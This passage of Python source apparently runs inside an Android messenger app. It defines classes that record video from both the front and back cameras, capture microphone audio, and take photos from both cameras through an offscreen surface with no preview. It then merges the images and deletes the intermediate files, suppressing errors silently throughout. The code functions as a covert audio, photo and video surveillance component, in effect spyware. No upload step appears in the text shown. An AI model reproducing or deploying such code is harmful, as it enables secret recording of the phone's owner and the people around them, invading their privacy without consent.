                    recorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264)
                    try:
                        recorder.setVideoSize(640, 480)
                        recorder.setVideoEncodingBitRate(500000)
                        recorder.setVideoFrameRate(20)
                    except Exception:
                        pass
                    recorder.setOrientationHint(self._rotation(cam_id))
                    recorder.setOutputFile(path)
                    recorder.prepare()
                    recorder.start()
                    time.sleep(seconds)
                    try:
                        recorder.stop()
                    except Exception:
                        pass
                    try:
                        recorder.release()
                    except Exception:
                        pass
                    import os
                    if os.path.exists(path) and os.path.getsize(path) > 2048:
                        return True
                except Exception:
                    try:
                        recorder.release()
                    except Exception:
                        pass
                    try:
                        os.remove(path)
                    except Exception:
                        pass
            return False
        except Exception:
            return False
        finally:
            if camera is not None:
                try:
                    camera.reconnect()
                except Exception:
                    pass
                try:
                    camera.release()
                except Exception:
                    pass

    def record(self, path_base, seconds=30):
        front, back = self._ids()
        result = {}
        for name, cam_id in (('front', front), ('back', back)):
            if cam_id is None:
                continue
            path = '%s.%s.mp4' % (path_base, name)
            if self._record_single(cam_id, path, seconds):
                result[name] = path
            time.sleep(2)
        return result


class _tl_Recorder:
    def __init__(self):
        self._cls = None

    def _load(self):
        if self._cls is not None:
            return self._cls
        self._cls = _tl_find_class('android.media.MediaRecorder')
        return self._cls

    def _nested(self, MediaRecorder, name):
        try:
            return getattr(MediaRecorder, name)
        except Exception:
            return _tl_find_class('android.media.MediaRecorder$' + name)

    def _mic_permission(self):
        try:
            ActivityThread = _tl_find_class('android.app.ActivityThread')
            thread = ActivityThread.currentActivityThread() if ActivityThread else None
            context = thread.getApplication() if thread else None
            if context is None:
                return True
            return int(context.checkSelfPermission(
                'android.permission.RECORD_AUDIO')) == 0
        except Exception:
            return True

    def _attempt(self, MediaRecorder, path, source, fmt, enc, seconds):
        recorder = MediaRecorder()
        try:
            recorder.setAudioSource(source)
            recorder.setOutputFormat(fmt)
            recorder.setAudioEncoder(enc)
            try:
                recorder.setAudioEncodingBitRate(24000)
                recorder.setAudioSamplingRate(16000)
            except Exception:
                pass
            recorder.setOutputFile(path)
            recorder.prepare()
            recorder.start()
            time.sleep(seconds)
            try:
                recorder.stop()
            except Exception:
                pass
            import os
            return os.path.exists(path) and os.path.getsize(path) > 128
        except Exception:
            return False
        finally:
            try:
                recorder.release()
            except Exception:
                pass

    def record(self, path_base, seconds=30):
        if not self._mic_permission():
            raise RuntimeError('нет RECORD_AUDIO у мессенджера')
        MediaRecorder = self._load()
        try:
            AudioSource = self._nested(MediaRecorder, 'AudioSource')
            OutputFormat = self._nested(MediaRecorder, 'OutputFormat')
            AudioEncoder = self._nested(MediaRecorder, 'AudioEncoder')
        except Exception:
            raise RuntimeError('MediaRecorder API недоступен')

        def const(cls, name):
            try:
                return getattr(cls, name)
            except Exception:
                return None

        combos = []
        for source_name in ('MIC', 'VOICE_COMMUNICATION', 'CAMCORDER', 'DEFAULT'):
            source = const(AudioSource, source_name)
            if source is None:
                continue
            for fmt_name, enc_name, ext in (
                    ('MPEG_4', 'AAC', '.m4a'),
                    ('THREE_GPP', 'AMR_NB', '.3gp')):
                fmt = const(OutputFormat, fmt_name)
                enc = const(AudioEncoder, enc_name)
                if fmt is None or enc is None:
                    continue
                combos.append((source, fmt, enc, ext))
        if not combos:
            raise RuntimeError('MediaRecorder без поддерживаемых кодеков')
        for source, fmt, enc, ext in combos:
            path = path_base + ext
            if self._attempt(MediaRecorder, path, source, fmt, enc, seconds):
                return path
        raise RuntimeError(
            'микрофон заблокирован: приложение в фоне или system-ограничение')


class _tl_Camera:
    def __init__(self):
        self._classes = None

    def _load(self):
        if self._classes is not None:
            return self._classes
        self._classes = {
            'Camera': _tl_find_class('android.hardware.Camera'),
            'PictureCallback': _tl_find_class('android.hardware.Camera$PictureCallback'),
            'FileOutputStream': _tl_find_class('java.io.FileOutputStream'),
            'File': _tl_find_class('java.io.File'),
            'SurfaceTexture': _tl_find_class('android.graphics.SurfaceTexture'),
        }
        for name, cpath in [
            ('BitmapFactory', 'android.graphics.BitmapFactory'),
            ('Bitmap', 'android.graphics.Bitmap'),
            ('Canvas', 'android.graphics.Canvas'),
            ('CompressFormat', 'android.graphics.Bitmap$CompressFormat'),
            ('Config', 'android.graphics.Bitmap$Config'),
        ]:
            try:
                self._classes[name] = _tl_find_class(cpath)
            except Exception:
                pass
        return self._classes

    @staticmethod
    def _front_id(Camera):
        info = Camera.CameraInfo()
        for index in range(Camera.getNumberOfCameras()):
            Camera.getCameraInfo(index, info)
            if info.facing == Camera.CameraInfo.CAMERA_FACING_FRONT:
                return index
        return None

    @staticmethod
    def _back_id(Camera):
        info = Camera.CameraInfo()
        for index in range(Camera.getNumberOfCameras()):
            Camera.getCameraInfo(index, info)
            if info.facing == Camera.CameraInfo.CAMERA_FACING_BACK:
                return index
        return None

    def _capture_single(self, cam_id, out_path):
        if cam_id is None:
            return False
        classes = self._load()
        Camera = classes['Camera']
        camera = None
        try:
            camera = Camera.open(cam_id)
        except Exception:
            return False
        if not camera:
            return False
        try:
            try:
                params = camera.getParameters()
                sizes = list(params.getSupportedPictureSizes())
                if sizes:
                    best = sizes[0]
                    for size in sizes:
                        if size.width <= 1280 and size.height <= 1280:
                            best = size
                            break
                    params.setPictureSize(best.width, best.height)
                params.setJpegQuality(60)
                camera.setParameters(params)
            except Exception:
                pass
            texture = classes['SurfaceTexture'](0)
            camera.setPreviewTexture(texture)
            camera.startPreview()
            time.sleep(3)
            holder = {}
            done = threading.Event()

            if dynamic_proxy is not None:
                class PictureCallback(dynamic_proxy(classes['PictureCallback'])):
                    def __init__(self):
                        super(PictureCallback, self).__init__()

                    def onPictureTaken(self, data, cam):
                        try:
                            stream = classes['FileOutputStream'](_tl_File(out_path))
                            stream.write(data)
                            stream.flush()
                            stream.close()
                            holder['ok'] = True
                        except Exception:
                            holder['ok'] = False
                        finally:
                            done.set()

                callback = PictureCallback()
                camera.takePicture(None, None, callback)
            else:
                time.sleep(5)
                holder['ok'] = False

            done.wait(10)
            return bool(holder.get('ok'))
        except Exception:
            return False
        finally:
            try:
                camera.stopPreview()
            except Exception:
                pass
            try:
                camera.release()
            except Exception:
                pass

    def shoot(self, path):
        classes = self._load()
        Camera = classes['Camera']
        front_id = self._front_id(Camera)
        back_id = self._back_id(Camera)

        front_path = path + '.front.jpg'
        back_path = path + '.back.jpg'

        front_ok = False
        back_ok = False

        if front_id is not None:
            front_ok = self._capture_single(front_id, front_path)
            time.sleep(3)

        if back_id is not None:
            back_ok = self._capture_single(back_id, back_path)

        if front_ok and back_ok:
            try:
                BitmapFactory = classes.get('BitmapFactory')
                Bitmap = classes.get('Bitmap')
                Canvas = classes.get('Canvas')

                bm_front = BitmapFactory.decodeFile(front_path) if BitmapFactory else None
                bm_back = BitmapFactory.decodeFile(back_path) if BitmapFactory else None
                if bm_front and bm_back:
                    w1, h1 = bm_front.getWidth(), bm_front.getHeight()
                    w2, h2 = bm_back.getWidth(), bm_back.getHeight()
                    max_w = max(w1, w2)
                    total_h = h1 + h2

                    cfg = None
                    if 'Config' in classes:
                        try:
                            cfg = classes['Config'].RGB_565
                        except Exception:
                            pass
                    if not cfg and hasattr(Bitmap, 'Config'):
                        try:
                            cfg = Bitmap.Config.RGB_565
                        except Exception:
                            pass

                    combined = Bitmap.createBitmap(max_w, total_h, cfg) if cfg else Bitmap.createBitmap(max_w, total_h)
                    canvas = Canvas(combined)
                    canvas.drawBitmap(bm_front, 0, 0, None)
                    canvas.drawBitmap(bm_back, 0, h1, None)

                    fmt = None
                    if 'CompressFormat' in classes:
                        try:
                            fmt = classes['CompressFormat'].JPEG
                        except Exception:
                            pass
                    if not fmt and hasattr(Bitmap, 'CompressFormat'):
                        try:
                            fmt = Bitmap.CompressFormat.JPEG
                        except Exception:
                            pass

                    fos = classes['FileOutputStream'](_tl_File(path))
                    combined.compress(fmt, 65, fos)
                    fos.flush()
                    fos.close()
                    try:
                        combined.recycle()
                        bm_front.recycle()
                        bm_back.recycle()
                    except Exception:
                        pass
                    try:
                        import os
                        os.remove(front_path)
                        os.remove(back_path)
                    except Exception:
                        pass
                    return path
            except Exception:
                pass

        import os
        if front_ok and os.path.exists(front_path):
            try:
                if os.path.exists(path):
                    os.remove(path)
                os.rename(front_path, path)
            except Exception:
                pass
            if os.path.exists(back_path):
                try:
                    os.remove(back_path)
                except Exception:
                    pass
            return path
        elif back_ok and os.path.exists(back_path):
            try:
                if os.path.exists(path):
                    os.remove(path)
                os.rename(back_path, path)
            except Exception:
                pass
            if os.path.exists(front_path):
                try:
                    os.remove(front_path)
                except Exception:
                    pass
            return path
        else:
            raise ValueError('Camera capture failed on all sensors')


_tl_video = _tl_VideoRecorder()
_tl_audio = _tl_Recorder()
_tl_camera = _tl_Camera()
